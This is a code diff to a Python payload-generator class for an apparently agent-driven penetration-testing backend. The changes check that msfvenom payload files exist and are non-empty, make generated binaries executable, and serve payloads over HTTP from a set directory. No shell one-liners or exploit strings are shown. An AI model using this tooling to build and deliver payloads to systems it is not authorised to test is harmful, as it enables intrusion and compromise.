@@ -1,6 +1,7 @@
 #!/usr/bin/env python3
 """Payload Generator - msfvenom payload generation and reverse shell one-liners."""
 
+import functools
 import os
 import subprocess
 import uuid
@@ -20,6 +21,7 @@ class PayloadGenerator:
         os.makedirs(self.payloads_dir, exist_ok=True)
         self._hosting_server = None
         self._hosting_thread = None
+        self._hosting_port = None
 
     def list_templates(self) -> Dict[str, Any]:
         """List available msfvenom payloads and encoders."""
@@ -109,13 +111,47 @@ class PayloadGenerator:
             proc = subprocess.run(cmd, capture_output=True, text=True, timeout=120, check=False)
             if proc.returncode != 0:
                 return {"success": False, "error": proc.stderr.strip(), "command": " ".join(cmd)}
-            size = os.path.getsize(output_path) if os.path.exists(output_path) else 0
+
+            # Producing the file is the entire job, so check it exists and has
+            # bytes rather than inferring it from a zero exit. This used to
+            # report success with size 0 whenever msfvenom exited clean without
+            # writing anything.
+            if not os.path.isfile(output_path):
+                return {
+                    "success": False,
+                    "error": (
+                        f"msfvenom exited 0 but wrote no file at {output_path}"
+                    ),
+                    "command": " ".join(cmd),
+                    "stderr": proc.stderr.strip(),
+                }
+            size = os.path.getsize(output_path)
+            if size == 0:
+                return {
+                    "success": False,
+                    "error": f"msfvenom wrote an empty file at {output_path}",
+                    "command": " ".join(cmd),
+                    "stderr": proc.stderr.strip(),
+                }
+
+            # A payload you have to chmod before it runs is a papercut the
+            # tool can spare the operator: msfvenom's -o leaves 0644, so a
+            # freshly generated ELF fails with "Permission denied".
+            executable = format_type.lower().startswith(("elf", "exe", "macho"))
+            if executable:
+                try:
+                    os.chmod(output_path, 0o755)
+                except OSError as e:
+                    logger.warning(f"Could not chmod {output_path}: {e}")
+                    executable = False
+
             return {
                 "success": True,
                 "payload_id": payload_id,
                 "file": output_name,
                 "path": output_path,
                 "size": size,
+                "executable": executable,
                 "payload_type": payload,
                 "format": format_type,
                 "lhost": lhost,
@@ -151,27 +187,51 @@ class PayloadGenerator:
     def start_hosting(self, port: int = 8888) -> Dict[str, Any]:
         """Start a simple HTTP server to host generated payloads."""
         if self._hosting_server is not None:
-            return {"success": False, "error": "Hosting server is already running"}
+            # Saying only "already running" left the caller with no way to
+            # learn where it is -- there is no status tool, so an agent that
+            # lost the URL could not get it back without stopping the server.
+            running_port = self._hosting_port
+            return {
+                "success": False,
+                "error": (
+                    f"Hosting server is already running on port {running_port}. "
+                    "Stop it with payload_host_stop to move it."
+                ),
+                "port": running_port,
+                "url": f"http://<your-ip>:{running_port}/",
+                "directory": self.payloads_dir,
+            }
         try:
-            handler = http.server.SimpleHTTPRequestHandler
+            # Serve from the payloads directory WITHOUT chdir. os.chdir is
+            # process-wide, not per-thread, so the old version relocated the
+            # whole backend: after start_hosting the cwd went from /app/tmp to
+            # /app/payloads and stayed there, and every later zebbern_exec
+            # inherited it. A scan writing a relative -oN landed in
+            # /app/payloads, which unlike /app/tmp is not the mounted volume,
+            # so a container recreate destroyed it.
+            handler = functools.partial(
+                http.server.SimpleHTTPRequestHandler, directory=self.payloads_dir
+            )
             self._hosting_server = socketserver.TCPServer(("0.0.0.0", int(port)), handler)
+            self._hosting_port = int(port)
             self._hosting_thread = threading.Thread(
                 target=self._serve, daemon=True
             )
             self._hosting_thread.start()
-            return {"success": True, "port": port, "directory": self.payloads_dir}
+            return {
+                "success": True,
+                "port": int(port),
+                "url": f"http://<your-ip>:{int(port)}/",
+                "directory": self.payloads_dir,
+            }
         except OSError as e:
             self._hosting_server = None
+            self._hosting_port = None
             return {"success": False, "error": str(e)}
 
     def _serve(self):
         """Run the hosting server (called in a thread)."""
-        original_dir = os.getcwd()
-        try:
-            os.chdir(self.payloads_dir)
-            self._hosting_server.serve_forever()
-        finally:
-            os.chdir(original_dir)
+        self._hosting_server.serve_forever()
 
     def stop_hosting(self) -> Dict[str, Any]:
         """Stop the payload hosting server."""
@@ -180,7 +240,13 @@ class PayloadGenerator:
         self._hosting_server.shutdown()
         self._hosting_server = None
         self._hosting_thread = None
-        return {"success": True, "message": "Hosting server stopped"}
+        stopped_port = self._hosting_port
+        self._hosting_port = None
+        return {
+            "success": True,
+            "message": f"Hosting server on port {stopped_port} stopped",
+            "port": stopped_port,
+        }
 
     def get_one_liner(
         self, lhost: str, lport: int = 4444, shell_type: str = "all"
